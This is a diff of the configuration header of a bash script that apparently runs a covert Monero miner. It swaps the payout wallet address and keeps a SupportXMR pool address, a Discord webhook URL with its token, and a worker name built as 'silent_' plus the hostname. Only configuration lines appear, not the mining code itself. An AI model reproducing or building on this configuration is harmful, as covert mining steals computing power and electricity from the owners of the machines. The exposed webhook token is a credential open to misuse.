@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ========== CONFIG ==========
-WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WALLET="48NiGqEZT6GV7acihQu6VMHjDKMZYPKXZ1bQCcdFrXjc1xDjc6D9sR1YsDppa1v9QkRbvgn2cGi424LPfvnXGbcLVAcyK9p"
 POOL="pool.supportxmr.com:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
 WORKER="silent_$(hostname)"
